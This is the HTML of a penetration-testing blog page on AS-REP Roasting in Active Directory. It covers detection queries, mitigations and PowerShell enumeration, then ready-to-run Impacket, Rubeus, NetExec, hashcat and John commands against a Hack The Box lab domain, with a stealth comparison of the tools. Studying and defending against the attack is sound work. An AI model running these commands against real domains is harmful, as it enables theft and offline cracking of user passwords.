+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    [Client]                            [KDC]
+</span></span><span style="display:flex;"><span>        |                                 |
+</span></span><span style="display:flex;"><span>        |  1. AS-REQ                      |
+</span></span><span style="display:flex;"><span>        |  (Encrypted Timestamp)          |
+</span></span><span style="display:flex;"><span>        |--------------------------------&gt;|
+</span></span><span style="display:flex;"><span>        |                                 |
+</span></span><span style="display:flex;"><span>        |             2. Decrypt &amp; Verify |
+</span></span><span style="display:flex;"><span>        |                   Timestamp     |
+</span></span><span style="display:flex;"><span>        |                                 |
+</span></span><span style="display:flex;"><span>        |  3. AS-REP                      |
+</span></span><span style="display:flex;"><span>        |  (TGT if timestamp valid)       |
+</span></span><span style="display:flex;"><span>        |&lt;--------------------------------|
+</span></span><span style="display:flex;"><span>        |                                 |</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="without-pre-authentication-how-asreproasting-works">Without Pre-Authentication (how ASREPRoasting works):</h3>
+<ul>
+<li>Attacker sends a fake AS-REQ</li>
+<li>The KDC sends a TGT immediately, no password needed</li>
+<li>The AS-REP includes the TGT and additional encrypted data</li>
+<li>This data can be cracked offline to obtain the user&rsquo;s key (password hash)</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20%20%20%20%20[Attacker]%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[KDC]%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%201.%20AS-REQ%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%28No%20Pre-Auth%20Required%29%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c--------------------------------%3e%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%202.%20No%20Verification%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Needed%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%203.%20AS-REP%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%28Encrypted%20TGT%20&#43;%20Data%29%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%3c--------------------------------%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%204.%20Offline%20Cracking%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20Begins%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>        [Attacker]                          [KDC]
+</span></span><span style="display:flex;"><span>            |                                 |
+</span></span><span style="display:flex;"><span>            |  1. AS-REQ                      |
+</span></span><span style="display:flex;"><span>            |  (No Pre-Auth Required)         |
+</span></span><span style="display:flex;"><span>            |--------------------------------&gt;|
+</span></span><span style="display:flex;"><span>            |                                 |
+</span></span><span style="display:flex;"><span>            |            2. No Verification   |
+</span></span><span style="display:flex;"><span>            |               Needed            |
+</span></span><span style="display:flex;"><span>            |                                 |
+</span></span><span style="display:flex;"><span>            |  3. AS-REP                      |
+</span></span><span style="display:flex;"><span>            |  (Encrypted TGT + Data)         |
+</span></span><span style="display:flex;"><span>            |&lt;--------------------------------|
+</span></span><span style="display:flex;"><span>            |                                 |
+</span></span><span style="display:flex;"><span>            |  4. Offline Cracking            |
+</span></span><span style="display:flex;"><span>            |     Begins                      |
+</span></span><span style="display:flex;"><span>            |                                 |</span></span></code></pre></div>
+    
+</div>
+<h3 id="detection-and-defense">Detection and Defense:</h3>
+<h4 id="detection-methods">Detection Methods</h4>
+<ul>
+<li>Monitor Active Directory logs for unusual AS-REP requests, particularly those without preauthentication:
+<ul>
+<li>Event ID = <code>4768</code> and <code>4625</code></li>
+<li>Ticket Encryption Type = <code>0x17</code>.</li>
+<li>Ticket Options = <code>0x5080000</code>.</li>
+<li>Service Name = krbtgt</li>
+</ul>
+</li>
+<li>Regularly scan user accounts for the <code>DONT_REQ_PREAUTH</code> attribute</li>
+<li>SIEM Detection Rules:
+<ul>
+<li>Splunk: <code>index=windows EventCode=4768 AND Preauthentication_Type=&quot;0x0&quot;</code></li>
+<li>Microsoft Sentinel: <code>SecurityEvent | where EventID == 4768 | where PreAuthType == &quot;0&quot;</code></li>
+<li>Elastic: <code>event.code:4768 AND winlog.event_data.PreAuthType:0</code></li>
+</ul>
+</li>
+<li><strong>PowerShell</strong>:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Get-ADUser%20-Filter%20%7bDoesNotRequirePreAuth%20-eq%20$True%7d%20-Properties%20DoesNotRequirePreAuth">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADUser -Filter {DoesNotRequirePreAuth <span style="color:#f92672">-eq</span> $True} -Properties DoesNotRequirePreAuth</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h4 id="mitigation-strategies">Mitigation Strategies:</h4>
+<ul>
+<li>Disable the &ldquo;Do not require Kerberos preauthentication&rdquo; setting unless absolutely necessary</li>
+<li>Enforce strong password policies to reduce the risk of password cracking</li>
+<li>Use multifactor authentication (MFA) for accounts with elevated privileges</li>
+<li>Regularly review and audit account settings in Active Directory</li>
+</ul>
+<h4 id="defense-in-depth-strategies">Defense in Depth Strategies:</h4>
+<!-- raw HTML omitted -->
+<h4 id="network-segmentation">Network Segmentation:</h4>
+<ul>
+<li>Implement network zones to limit access to the Domain Controller.</li>
+<li>Use PAWs (<a href="https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-devices">Privileged Access Workstations</a>) for administrative tasks.</li>
+<li>Deploy honeypot accounts with <code>DONT_REQ_PREAUTH</code> to detect attempts.</li>
+</ul>
+<!-- raw HTML omitted -->
+<h4 id="monitoring-and-alerting">Monitoring and Alerting:</h4>
+<ul>
+<li>Set up automated scripts to monitor for <code>DONT_REQ_PREAUTH</code> changes.</li>
+<li>Create alerts for sudden increases in AS-REQ traffic.</li>
+<li>Monitor for known AS-REP Roasting tool signatures.</li>
+</ul>
+<!-- raw HTML omitted -->
+<h4 id="active-directory-hardening">Active Directory Hardening:</h4>
+<ul>
+<li>Regular security assessments focusing on Kerberos configurations.</li>
+<li>Implement LAPS for local admin password management.
+<ul>
+<li>This way if tickets are extracted they cannot be cracked.</li>
+</ul>
+</li>
+<li>Use tiered administration model to limit attack surface.</li>
+</ul>
+<h4 id="common-misconfigurations-in-ad-environments-that-can-lead-to-as-rep-roasting">Common Misconfigurations in AD Environments that can lead to AS-REP Roasting:</h4>
+<p><strong>All of the below should be looked out for in your environments</strong>.</p>
+<ul>
+<li>Default service account configurations in specific applications:
+<ul>
+<li>Exchange Server service accounts</li>
+<li>SQL Server service accounts</li>
+<li>Legacy application service accounts</li>
+</ul>
+</li>
+<li>Legacy systems requiring Kerberos compatibility</li>
+<li>Misconfigured trust relationships between domains</li>
+<li>Improperly migrated user accounts from older AD versions</li>
+<li>Third-party applications requiring <code>DONT_REQ_PREAUTH</code> for compatibility</li>
+</ul>
+<h2 id="enumeration-tools">AS-REP-Roasting Enumeration Tools:</h2>
+<ul>
+<li>+Note+: In all of the below enumeration &amp; attack screenshots the user &ldquo;svc-alfresco&rdquo; is susceptible to AS-REP Roasting.</li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="using-powerview-to-enumerate-users-susceptible-to-as-rep-roasting">Using PowerView to Enumerate users susceptible to AS-REP Roasting:</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Get-DomainUser%20-KerberosPreauthNotRequired%20-Properties%20samaccountname,useraccountcontrol,memberof">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-14-200344_.png">
+</figure>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="using-powershell-to-enumerate-users-susceptible-to-as-rep-roasting">Using PowerShell to Enumerate users susceptible to AS-REP Roasting:</h3>
+<ul>
+<li><strong>Vanilla Powershell</strong>:</li>
+</ul>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(New-Object DirectoryServices.DirectorySearcher <span style="color:#e6db74">&#34;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#34;</span>).FindAll() | ForEach-Object { $_.Properties | Select-Object @{n=<span style="color:#e6db74">&#39;sAMAccountName&#39;</span>;e={$_[<span style="color:#e6db74">&#39;sAMAccountName&#39;</span>][<span style="color:#ae81ff">0</span>]}}, @{n=<span style="color:#e6db74">&#39;displayName&#39;</span>;e={$_[<span style="color:#e6db74">&#39;displayName&#39;</span>][<span style="color:#ae81ff">0</span>]}} }</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-14-202255_.png">
+</figure>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="using-powershell-amp-ad-module-to-enumerate-users-susceptible-to-as-rep-roasting">Using PowerShell &amp; AD Module to Enumerate users susceptible to AS-REP Roasting:</h3>
+<ul>
+<li><strong>Powershell Active Directory Powershell Module</strong>:</li>
+</ul>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#%20Shows%20all%20details%20for%20User%20Account%0aGet-ADUser%20-Filter%20%7bDoesNotRequirePreAuth%20-eq%20%27True%27%7d%20%7c%20fl%0a%0a#%20Provides%20just%20the%20name%0aGet-ADUser%20-filter%20%7bDoesNotRequirePreAuth%20-eq%20%27True%27%7d%20%7c%20select%20name">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Shows all details for User Account</span>
+</span></span><span style="display:flex;"><span>Get-ADUser -Filter {DoesNotRequirePreAuth <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;True&#39;</span>} | fl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Provides just the name</span>
+</span></span><span style="display:flex;"><span>Get-ADUser -filter {DoesNotRequirePreAuth <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;True&#39;</span>} | select name</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-11-14-202419_.png">
+</figure>
+
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-11-14-202842_.png">
+</figure>
+
+</li>
+<li>
+<p><strong>Using Powershell AD Module &amp; an LDAP filter</strong>:</p>
+</li>
+</ul>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADObject -LdapFilter  <span style="color:#e6db74">&#34;(&amp;(&amp;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))))&#34;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-14-200314_.png">
+</figure>
+</li>
+</ul>
+<h2 id="as-rep-roasting-tools">AS-REP Roasting +Attack+ Tools:</h2>
+<!-- raw HTML omitted -->
+<h3 id="using-impacket-getnpusers-for-as-rep-roasting-attack">Using Impacket-GetNPUsers for AS-REP Roasting Attack:</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#%20General%20command%20to%20find%20AS-REP%20roastable%20accounts%0aimpacket-GetNPUsers%20$domain/%20-request%20-format%20hashcat%20-outputfile%20hashes.txt%0a%0a#%20With%20a%20specified%20users%20file%20and%20domain%20controller%20IP%0aGetNPUsers.py%20[DOMAIN]/%20-dc-ip%20[DC_IP]%20-usersfile%20[UserFile]%20-format%20hashcat%20-outputfile%20hashes.txt%20-no-pass%0a%0a#%20Example%20usage%0aGetNPUsers.py%20SUGARAPE/%20-dc-ip%2010.129.205.35%20-usersfile%20/tmp/users.txt%20-format%20hashcat%20-outputfile%20/tmp/hashes.txt%20-no-pass">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># General command to find AS-REP roastable accounts</span>
+</span></span><span style="display:flex;"><span>impacket-GetNPUsers $domain/ -request -format hashcat -outputfile hashes.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># With a specified users file and domain controller IP</span>
+</span></span><span style="display:flex;"><span>GetNPUsers.py <span style="color:#f92672">[</span>DOMAIN<span style="color:#f92672">]</span>/ -dc-ip <span style="color:#f92672">[</span>DC_IP<span style="color:#f92672">]</span> -usersfile <span style="color:#f92672">[</span>UserFile<span style="color:#f92672">]</span> -format hashcat -outputfile hashes.txt -no-pass
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage</span>
+</span></span><span style="display:flex;"><span>GetNPUsers.py SUGARAPE/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-14-203746_.png">
+</figure>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="using-rubeus-for-as-rep-roasting-attack">Using Rubeus for AS-REP Roasting Attack:</h3>
+<ul>
+<li>Has an <strong>ASREPRoast</strong>: module for Windows-based attacks:</li>
+</ul>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#%20Standard%20Rubeus%0aRubeus.exe%20asreproast%20/format:hashcat%20/outfile:hashes.txt%0a%0a#%20If%20running%20via%20download%20cradle%20from%20PowerSharpPack%0aPowerSharpPack%20-rubeus%20-Command%20%22asreproast%20/format:hashcat%20/outfile:hashes.txt%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Standard Rubeus</span>
+</span></span><span style="display:flex;"><span>Rubeus.exe asreproast /format<span style="color:#960050;background-color:#1e0010">:</span>hashcat /outfile<span style="color:#960050;background-color:#1e0010">:</span>hashes.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If running via download cradle from PowerSharpPack</span>
+</span></span><span style="display:flex;"><span>PowerSharpPack -rubeus -Command <span style="color:#e6db74">&#34;asreproast /format:hashcat /outfile:hashes.txt&#34;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-14-203239_.png">
+</figure>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h3 id="using-netexec-for-as-rep-roasting-attack">Using Netexec for AS-REP Roasting Attack:</h3>
+<ul>
+<li>
+<p>In my experience this always needs a list of supplied users to attempt to asreproast with.</p>
+<!-- raw HTML omitted -->
+</li>
+</ul>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20ldap%20$machine.$domain%20-u%20Users.txt%20-p%20%27%27%20--asreproast%20asRepTickets.txt">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec ldap $machine.$domain -u Users.txt -p <span style="color:#e6db74">&#39;&#39;</span> --asreproast asRepTickets.txt</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-14-204516_.png">
+</figure>
+</li>
+</ul>
+<h3 id="targeted-as-reproasting-attack">Targeted AS-REPRoasting Attack:</h3>
+<ul>
+<li>If an attacker has <code>GenericWrite</code> or <code>GenericAll</code> permissions over an account, they can enable this attribute, request the AS-REP for offline cracking, then disable it again</li>
+<li>The success of this attack depends on the user having a weak password</li>
+</ul>
+<h4 id="cracking-as-rep-tickets">Cracking AS-Rep Tickets</h4>
+<ul>
+<li>
+<p><strong>Using Hashcat</strong>:</p>
+<ul>
+<li>Mode <code>18200</code> for cracking AS-REP hashes</li>
+<li>Command: <code>hashcat -m 18200 asRepTickets.txt wordlist.txt -r rules/best64.rule</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Using John</strong>:</p>
+<ul>
+<li><code>john --wordlist=~/Wordlist asRepTickets.txt</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="tool-comparison-matrix">Tool Comparison Matrix</h4>
+<table>
+  <thead>
+      <tr>
+          <th>Tool</th>
+          <th>Windows/Linux</th>
+          <th>Auth Required</th>
+          <th>Stealth Level</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Rubeus</td>
+          <td>Windows</td>
+          <td>Yes</td>
+          <td>Medium</td>
+      </tr>
+      <tr>
+          <td>Impacket</td>
+          <td>Linux</td>
+          <td>No</td>
+          <td>High</td>
+      </tr>
+      <tr>
+          <td>PowerView</td>
+          <td>Windows</td>
+          <td>Yes</td>
+          <td>Low</td>
+      </tr>
+      <tr>
+          <td>NetExec</td>
+          <td>Both</td>
+          <td>(User list)</td>
+          <td>Medium</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="comparison-with-other-attack-techniques">Comparison with Other Attack Techniques:</h3>
+<h4 id="asreproasting-vs-kerberoasting">AS-REP Roasting vs Kerberoasting:</h4>
+<ul>
+<li>Lower detection rate due to fewer logging mechanisms</li>
+<li>Smaller attack surface (fewer vulnerable accounts)</li>
+<li>Often overlooked in security audits</li>
+<li>No need for service account enumeration</li>
+</ul>
+<h4 id="asreproasting-vs-password-spraying">AS-REP Roasting vs Password Spraying:</h4>
+<ul>
+<li>More stealthy as it doesn&rsquo;t generate failed login attempts</li>
+<li>Can be performed without valid domain credentials</li>
+<li>Offline cracking reduces detection risk</li>
+<li>Targeted approach vs broad-spectrum attack</li>
+</ul>
+<h3 id="practice-on-hack-the-box">Practice AS-REP Roasting on Hack The Box</h3>
+<p><strong>The following machines are good for practice AS-REP Roasting</strong>:</p>
+<ul>
+<li>
+<p><a href="https://app.hackthebox.com/machines/Forest">https://app.hackthebox.com/machines/Forest</a></p>
+<ul>
+<li>+My Walkthrough+: <a href="https://bloodstiller.com/walkthroughs/forest-box/">https://bloodstiller.com/walkthroughs/forest-box/</a></li>
+</ul>
+</li>
+<li>
+<p><a href="https://app.hackthebox.com/prolabs/overview/Sauna">https://app.hackthebox.com/prolabs/overview/Sauna</a></p>
+<ul>
+<li>+My Walkthrough+: <a href="https://bloodstiller.com/walkthroughs/sauna-box/">https://bloodstiller.com/walkthroughs/sauna-box/</a></li>
+</ul>
+</li>
+<li>
+<p><a href="https://app.hackthebox.com/prolabs/overview/dante">https://app.hackthebox.com/prolabs/overview/dante</a></p>
+<ul>
+<li>This is a prolab and AS-REP Roasting is one of many attack/privesc chains.</li>
+</ul>
+</li>
+</ul>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        1142
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Nov 15 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
